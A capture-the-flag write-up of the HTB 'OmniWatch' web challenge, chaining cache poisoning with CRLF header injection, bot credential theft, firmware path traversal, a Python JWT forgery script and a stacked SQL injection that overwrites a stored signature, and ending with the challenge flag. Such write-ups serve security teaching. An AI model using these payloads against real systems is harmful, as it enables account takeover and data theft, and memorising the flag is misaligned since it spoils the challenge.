---
title: "HTB Cyber Apocalypse: OmniWatch"
description: "Writeup covering a full chain of cache poisoning, bot credential theft, firmware path traversal, JWT forgery, and SQL injection."
slug: htb-omniwatch
date: 2026-02-10 13:31:00+0300
competition: "HTB Cyber Apocalypse"
categories:
    - Web Exploitation
tags:
    - htb
    - web
    - cache-poisoning
    - xss
    - jwt
    - sqli
---

## Challenge

`OmniWatch` was provided locally with extracted source and a live target. The scenario asked for the last known location hidden behind the mercenary tracking panel at `154.57.164.82:31238`.

This writeup is based on the extracted challenge files and the preserved exploit workflow.

## Attack Surface

Reviewing the extracted app exposed the full chain:

- `cache.vcl` trusted an attacker-controlled `CacheKey` header and allowed cacheable responses when the backend returned `CacheKey: enable`.
- The Zig `oracle` service reflected `DeviceId` directly into an HTTP header and rendered user-controlled `mode` into HTML.
- `bot.py` logged in as the moderator on a schedule and then visited `/oracle/json/<id>`.
- `firmware()` opened whatever path was passed in `patch`.
- `fetch_device()` used `f"SELECT * FROM devices WHERE device_id = '{device_id}'"`, giving a straight SQL injection on `/controller/device/<id>`.

That meant the solve path was:

1. Cache-poison the login page.
2. Steal the moderator credentials when the bot logged in.
3. Use firmware path traversal to read `jwt_secret.txt`.
4. Forge an administrator JWT.
5. Update the stored signature through SQL injection so the JWT signature check passed.
6. Visit `/controller/admin`.

## Step 1: Poison The Login Page And Leak Moderator Credentials

The oracle endpoint reflected both the response body and the `DeviceId` header:

```zig
res.header("DeviceId", decodedDeviceId);
```

The cache layer keyed on `req.http.CacheKey`, so I poisoned a cacheable login response with injected HTML and JavaScript. When the scheduled bot loaded the cached login page and submitted the moderator credentials, the script sent them into a cacheable oracle response that I could replay.

Core idea:

```powershell
$base = 'http://154.57.164.82:31238'
$payload = '</p><input id=username><input id=password><button id=login-btn>x</button><script>/* exfil */</script><p>'
$mode = [uri]::EscapeDataString($payload)

curl.exe -s "$base/oracle/$mode/abc%0d%0aContent-Type:%20text/html%0d%0aCacheKey:%20enable" > $null
curl.exe -i -s -H "CacheKey: leak" "$base/controller/login"
```

Once the poisoned response was hit by the bot, replaying the cache leaked the moderator pair through the oracle response headers.

## Step 2: Read The JWT Secret Through Firmware Path Traversal

After authenticating as the leaked moderator user, the next primitive was the file read in `/controller/firmware`. The route joined the supplied filename directly:

```python
file_data = open(os.path.join(os.getcwd(), "application", "firmware", patch)).read()
```

A relative traversal from `application/firmware/` to `/app/jwt_secret.txt` was enough:

```powershell
$base = 'http://154.57.164.82:31238'
curl.exe -i -s -b cookies.txt -d "patch=../../../jwt_secret.txt" "$base/controller/firmware"
```

That returned the runtime JWT secret.

## Step 3: Forge Administrator Access And Sync The Signature

The app did not only verify the JWT. It also compared the token signature against a value stored in the `signatures` table. So forging a token was not enough by itself.

First I generated an admin token with the leaked secret:

```python
import base64, hashlib, hmac, json

secret = "<jwt_secret>"
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "user_id": 1,
    "username": "<moderator_username>",
    "account_type": "administrator",
}

def b64url(x):
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

seg1 = b64url(json.dumps(header, separators=(",", ":")).encode())
seg2 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(secret.encode(), f"{seg1}.{seg2}".encode(), hashlib.sha256).digest()
token = f"{seg1}.{seg2}.{b64url(sig)}"
print(token)
```

Then I used the SQL injection in `/controller/device/<id>` to overwrite the stored signature for `user_id = 1` with the signature from the forged JWT:

```powershell
$sig = "<forged_jwt_signature>"
$payload = "1';UPDATE signatures SET signature='$sig' WHERE user_id=1-- -"
$enc = [uri]::EscapeDataString($payload)

curl.exe -i -s -b cookies.txt "http://154.57.164.82:31238/controller/device/$enc"
```

## Step 4: Fetch The Admin Page

With both checks aligned, the forged administrator JWT reached the admin dashboard cleanly:

```powershell
curl.exe -i -s -H "Cookie: jwt=<forged_admin_jwt>" "http://154.57.164.82:31238/controller/admin"
```

The response rendered the flag directly inside the admin tile.

## Final Result

Flag:

```text
HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_ce737a26d31848ee4262a3a30c0a07ce}
```

## Notes

- The cache poisoning was only useful because the bot repeatedly authenticated with live moderator credentials.
- The firmware route turned a post-auth foothold into arbitrary local file read.
- The signature table check looked like defense in depth, but the SQL injection in `fetch_device()` let me sync it with the forged JWT anyway.
